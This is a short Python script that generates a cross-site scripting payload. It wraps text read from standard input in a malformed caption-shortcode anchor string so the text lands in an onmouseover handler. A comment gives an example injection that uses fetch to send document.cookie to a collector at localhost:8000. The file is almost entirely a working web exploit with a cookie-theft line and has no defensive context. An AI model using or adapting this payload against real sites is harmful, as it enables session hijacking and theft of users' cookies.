import sys
from urllib.parse import quote_plus;

badString = """<a href="[caption code=">]</a><a title=" onmouseover={} ">link</a>"""

# An example injection:
#   fetch('http://localhost:8000?cookie='.concat(document.cookie))

injection = sys.stdin.read();
#print(badString.format(quote_plus(injection)));
print(badString.format(injection));
